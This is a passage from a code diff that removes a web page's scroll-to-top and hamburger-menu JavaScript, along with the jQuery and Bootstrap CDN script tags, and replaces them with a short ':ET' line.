-			el.classList.add('visible');
-		} else {
-			el.classList.remove('visible');
-		}
-	});
-
-	function scrollToTop() {
-		window.scrollTo({
-			top: 0,
-			behavior: 'smooth'
-		});
-	}
-</script>
-<script>
-	const hamburger = document.querySelector(".hamburger");
-	const navLinks = document.querySelector(".nav-links");
-	const links = document.querySelectorAll(".nav-links li");
-
-	hamburger.addEventListener('click', () => {
-		//Animate Links
-		navLinks.classList.toggle("open");
-		links.forEach(link => {
-			link.classList.toggle("fade");
-		});
-
-		//Hamburger Animation
-		hamburger.classList.toggle("toggle");
-	});
-
-
-</script>
-
-
-<script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
+:ET
